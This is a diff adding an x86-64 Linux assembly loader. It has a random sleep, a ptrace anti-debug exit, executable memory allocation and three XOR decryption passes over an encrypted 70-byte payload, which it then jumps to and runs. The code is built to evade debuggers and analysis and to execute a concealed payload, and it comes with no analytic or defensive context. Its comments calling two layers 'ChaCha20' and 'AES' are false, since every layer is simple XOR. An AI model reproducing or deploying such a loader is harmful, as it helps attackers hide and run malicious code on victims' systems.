@@ -1,0 +1,129 @@
+BITS 64
+DEFAULT REL
+
+section .text
+global _start
+
+_start:
+    ; Random delay
+    rdtsc
+    and eax, 0x3FFFFFFF    ; Limit to reasonable range
+    mov ecx, eax
+func6709:
+    pause
+    loop func6709
+
+    ; Anti-debug check
+    mov rax, 101          ; sys_ptrace
+    mov rdi, 0            ; PTRACE_TRACEME
+    xor rsi, rsi
+    xor rdx, rdx
+    xor r10, r10
+    syscall
+    test rax, rax
+    js exit               ; Exit if being debugged
+
+    ; Allocate executable memory
+    mov rax, 9            ; sys_mmap
+    xor rdi, rdi          ; addr = NULL
+    mov rsi, 70  ; size
+    mov rdx, 7            ; PROT_READ|PROT_WRITE|PROT_EXEC
+    mov r10, 0x22         ; MAP_PRIVATE|MAP_ANONYMOUS
+    mov r8, -1            ; fd = -1
+    xor r9, r9            ; offset = 0
+    syscall
+    test rax, rax
+    js exit
+    mov r15, rax          ; Save allocated address
+
+    ; Copy payload
+    mov rsi, jmp8063
+    mov rdi, r15
+    mov rcx, 70
+    rep movsb
+
+    ; Triple decryption
+    ; Decrypt XOR layer
+    mov rdi, r15
+    mov rcx, 70
+    xor rdx, rdx
+xor_loop2:
+    mov rax, rdx
+    and rax, 31           ; mod 32
+    mov al, [lbl8435 + rax]
+    xor [rdi], al
+    inc rdi
+    inc rdx
+    loop xor_loop2
+
+    ; Micro-delay
+    rdtsc
+    and eax, 0xFFFF
+    mov ecx, eax
+    rep nop
+
+    ; Decrypt ChaCha20 layer
+    mov rdi, r15
+    mov rcx, 70
+    xor rdx, rdx
+chacha_loop1:
+    mov rax, rdx
+    and rax, 31           ; mod 32
+    mov al, [loc3034 + rax]
+    xor [rdi], al
+    inc rdi
+    inc rdx
+    loop chacha_loop1
+
+    ; Micro-delay
+    rdtsc
+    and eax, 0xFFFF
+    mov ecx, eax
+    rep nop
+
+    ; Decrypt AES layer
+    mov rdi, r15
+    mov rcx, 70
+    xor rdx, rdx
+aes_loop0:
+    mov rax, rdx
+    and rax, 15           ; mod 16
+    mov al, [proc8036 + rax]
+    xor [rdi], al
+    inc rdi
+    inc rdx
+    loop aes_loop0
+
+    ; Final delay
+    rdtsc
+    and eax, 0xFFFFFF
+    mov ecx, eax
+final_delay:
+    pause
+    loop final_delay
+
+    ; Execute payload
+    jmp r15
+
+exit:
+    mov rax, 60           ; sys_exit
+    xor rdi, rdi
+    syscall
+
+section .data
+
+jmp8063:
+    db 0x17, 0x88, 0xa9, 0x2b, 0x5a, 0xd9, 0xb4, 0x1c, 0x29, 0x70, 0x12, 0x8d, 0xa1, 0xe0, 0x8c, 0x8e
+    db 0x23, 0x29, 0x73, 0xfd, 0x42, 0xba, 0xc4, 0xb7, 0x45, 0x02, 0x02, 0x5c, 0x55, 0x72, 0x8c, 0x8b
+    db 0x9f, 0x73, 0x69, 0x2a, 0x5a, 0x91, 0x85, 0xab, 0xe1, 0xb2, 0x55, 0xe4, 0xcd, 0x85, 0xa8, 0x66
+    db 0x65, 0x7b, 0x53, 0x8d, 0x23, 0x8b, 0x6f, 0x1a, 0x38, 0x66, 0x22, 0x39, 0x22, 0x12, 0xa7, 0x39
+    db 0x2b, 0x2a, 0x0d, 0x0b, 0x50, 0xd9
+
+lbl8435:
+    db 0x43, 0xb3, 0x95, 0x0e, 0xb7, 0xc8, 0x90, 0x51, 0x6f, 0xcc, 0x7f, 0x96, 0xac, 0x94, 0xc0, 0xe5, 0x7b, 0x09, 0x62, 0x1f, 0x7d, 0xfa, 0x80, 0x80, 0x74, 0x59, 0x16, 0xce, 0xcb, 0x2e, 0xa7, 0xc0
+
+loc3034:
+    db 0x1b, 0x0e, 0xc9, 0x2f, 0x1b, 0x8e, 0xdb, 0xba, 0x6c, 0xb7, 0x8c, 0x16, 0x01, 0xdf, 0xab, 0x41, 0x6a, 0xf3, 0x24, 0xe9, 0xc9, 0x97, 0x7c, 0x4a, 0xc0, 0x97, 0xf4, 0x9f, 0x9d, 0xf2, 0xcc, 0x2b
+
+proc8036:
+    db 0x07, 0xf2, 0x35, 0x0b, 0xf6, 0x9f, 0xff, 0xbf, 0xed, 0xcc, 0xe0, 0x0d, 0x0c, 0xab, 0xaf, 0xa7
